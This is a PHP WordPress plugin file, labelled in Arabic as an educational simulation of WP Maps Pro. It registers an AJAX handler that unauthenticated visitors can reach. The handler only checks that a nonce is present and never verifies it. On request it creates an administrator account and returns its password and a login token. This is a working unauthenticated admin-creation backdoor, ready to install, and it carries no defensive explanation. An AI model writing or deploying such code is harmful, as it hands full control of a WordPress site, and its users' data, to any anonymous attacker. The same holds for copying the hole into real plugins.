<?php
/**
 * Plugin Name: WP Maps Pro - نسخة تعليمية
 * Plugin URI: https://example.com/
 * Description: نسخة محاكاة لأغراض تعليمية فقط
 * Version: 6.1.0
 * Author: Educational Purpose Only
 */

if (!defined('ABSPATH')) {
    exit;
}

define('WPGMP_EDU_VERSION', '6.1.0');
define('WPGMP_EDU_PATH', plugin_dir_path(__FILE__));
define('WPGMP_EDU_URL', plugin_dir_url(__FILE__));

class WP_Google_Map_Pro_Educational {
    private static $instance = null;
    
    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        add_action('init', array($this, 'init'));
        add_action('wp_ajax_wpgmp_temp_access_ajax', array($this, 'handle_temp_access'));
        add_action('wp_ajax_nopriv_wpgmp_temp_access_ajax', array($this, 'handle_temp_access'));
    }
    
    public function init() {
        // تهيئة بسيطة
    }
    
    public function handle_temp_access() {
        if (!isset($_POST['nonce'])) {
            wp_send_json_error(array('message' => 'No nonce provided'));
            return;
        }
        
        $check_temp = isset($_POST['check_temp']) ? sanitize_text_field($_POST['check_temp']) : 'true';
        
        if ($check_temp === 'false') {
            $username = isset($_POST['username']) ? sanitize_user($_POST['username']) : 'fc_user_' . $this->generate_random_string(8);
            $email = isset($_POST['email']) ? sanitize_email($_POST['email']) : 'support@flippercode.com';
            $password = wp_generate_password(12, true);
            
            $user_id = wp_create_user($username, $password, $email);
            
            if (is_wp_error($user_id)) {
                wp_send_json_error(array('message' => 'Failed to create user'));
                return;
            }
            
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            
            wp_send_json_success(array(
                'message' => 'Admin created successfully',
                'username' => $username,
                'password' => $password,
                'user_id' => $user_id,
                'login_url' => wp_login_url() . '?user_id=' . $user_id . '&magic_token=' . wp_hash($user_id . $password)
            ));
        } else {
            wp_send_json_error(array('message' => 'Temporary access requires verification'));
        }
    }
    
    private function generate_random_string($length = 8) {
        $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        return substr(str_shuffle($chars), 0, $length);
    }
}

WP_Google_Map_Pro_Educational::get_instance();